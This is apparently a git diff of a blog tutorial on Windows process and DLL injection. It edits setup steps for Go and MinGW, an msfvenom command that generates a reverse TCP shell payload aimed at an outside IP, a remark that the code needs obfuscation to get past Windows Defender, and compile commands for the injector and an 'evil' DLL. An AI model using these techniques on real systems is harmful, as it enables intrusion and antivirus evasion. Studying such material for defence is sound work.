@@ -19,15 +19,50 @@ published: true
 - CreateRemoteThread()
 - CloseHandle(processHandle)  
 
-  
+# You'll need the GoLang compiler and MinGW-w64 (C/C++) installed on the development environment.  
 
-**I'm making the assumption you have mingw64 or the MSVC C++ developer tools (putting this here for me: "VC++ 2017 version 15.9 v14.16" because dumpbin.exe) installed on the Windows box, probably the Go compiler. Also assuming compiling from powershell (paths may be wonky otherwise)...**
+**GoLang Windows Installer**  
 
-**The first thing we're going to do is try injecting some basic shellcode into a remote process just as a quick demo in case you've never done this before and actually the place I went to learn the most basic syntax of the calls. Letz get started with some C...**
+<https://go.dev/dl/>  
+
+
+**MinGW-w64 installation...**  
+- Fetch the latest standalone package with MCF threads from [winlibs.com](https://winlibs.com/).  
+
+Direct download (July 2023)...  
+
+<https://github.com/brechtsanders/winlibs_mingw/releases/download/13.1.0-11.0.0-ucrt-r5/winlibs-x86_64-mcf-seh-gcc-13.1.0-mingw-w64ucrt-11.0.0-r5.zip>  
+
+- Unzip the archive (Windows haz tar?!)  
+
+```  
+tar -xf winlibs-x86_64-mcf-seh-gcc-13.1.0-mingw-w64ucrt-11.0.0-r5.zip  
+
+```  
+
+- Move the `mingw64` folder to the root of the drive.
+
+- Once we know the location of `mingw64`, modify the environmental variable `%PATH%`  
+
+```  
+rundll32 sysdm.cpl,EditEnvironmentVariables
+```  
+
+Edit the `Path` variable and add an entry for the location of `mingw64\bin`  
+
+- Open a new terminal and type `gcc --version`, if that errors, the environmental varibale is most likely incorrect.  
+
+**MSVC (Visual Studio) build tools may interfere with compilation, so exclude them from `%PATH%` temporarily if they're installed**  
+
+I'd installed `VC++ 2017 version 15.9 v14.16` build tools because I wanted `bindump.exe` and uninstalling after I nabbed the `bin` directory containing bindump semmed to fix the DLLs not compiling correctly. A less drastic approach is possible, I was only interested in bindump...  
+
+# The first thing we're going to do is try injecting some basic shellcode into a remote process just as a quick demo in case you've never done this before and actually the place I went to learn the most basic syntax of the calls.
 
 ## Take a look at Red Team Notes for a basic example of shellcode injection into a remote process. 
 
 **https://www.ired.team/offensive-security/code-injection-process-injection/process-injection**  
+
+**Without obfuscation, this code won't make it past windows defender**  
 
 - example-1.c  
 
@@ -132,7 +167,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=1.1.1.1 LPORT=4444 -f c -b "\\x0
 
 ![](/go-remote-dll-process-injection/example-1-shellcode.png)  
 
-Compile teh codez again...  
+Compile again...  
 
 ```  
 gcc example-1.c -o example-1.exe
@@ -142,9 +177,9 @@ gcc example-1.c -o example-1.exe
 
 ![](/go-remote-dll-process-injection/example-1-netstat.png)  
 
-## As you can see, our l33t haxor script injected itself into the target process and the shellcode was executed. Notepad is trying to reach out to a IP on the interweb, the POC script worked...  
+## As you can see, our l33t haxor script injected shellcode into the target process using `OpenProcess`, `VirtualAllocEx` , `WriteProcessMemory` , `CreateRemoteThread`, and `CloseHandle`. Notepad is sending SYN packets for a 3 way handshake. The POC script worked...  
 
-## Ok, cool. We know that we can make notepad run a reverse tcp shell payload by injecting shellcode. But this post is on injecting DLLs, wh4t the h3ck Tims, lets get this going, why you wasting my tim3s, could be doing something kewl right now...  
+## Ok, cool. We know that we can make notepad run a reverse tcp shell payload by injecting shellcode. But this post is on injecting DLLs  
 
 **This second example is going to teach us how to inject a DLL into a process's memory using C++**  
 
@@ -153,7 +188,7 @@ https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html
 
 **c prus plus, wtf's t1m, I thought we wuz gonna learn teh G0L4ngz...**  
 
-## The first piece of kit that we need is a proper DLL. I like this one a lot, its soooo cute! uWu  
+## The first piece of kit that we need is a proper DLL. Its soooo cute! uWu  
 
 - evil.cpp  
 
@@ -207,7 +242,8 @@ rundll32.exe c:\\evil.dll,DllMain
 
 ## Ok, on to the main C++ code, the injection scrip7...  
 
-  - example-2.cpp
+  - example-2.cpp  
+  
 ```cpp  
 /*
 * evil_inj.cpp
@@ -257,7 +293,7 @@ int main(int argc, char* argv[]) {
 ## Compile it...  
 
 ```  
-x86_64-w64-mingw32-gcc -O2 example-2.cpp -o example-2.exe -mconsole -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+x86_64-w64-mingw32-gcc -O2 example-2.cpp -o example-2.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
 ```  
 
 ![](/go-remote-dll-process-injection/example-2-error.png)  
@@ -310,7 +346,7 @@ int main(int argc, char* argv[]) {
 ## EZ. Okee... Compile it again...  
 
 ```  
-x86_64-w64-mingw32-gcc -O2 example-2.cpp -o example-2.exe -mconsole -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+x86_64-w64-mingw32-gcc -O2 example-2.cpp -o example-2.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
 ```  
 
 ![](/go-remote-dll-process-injection/example-2-success.png)
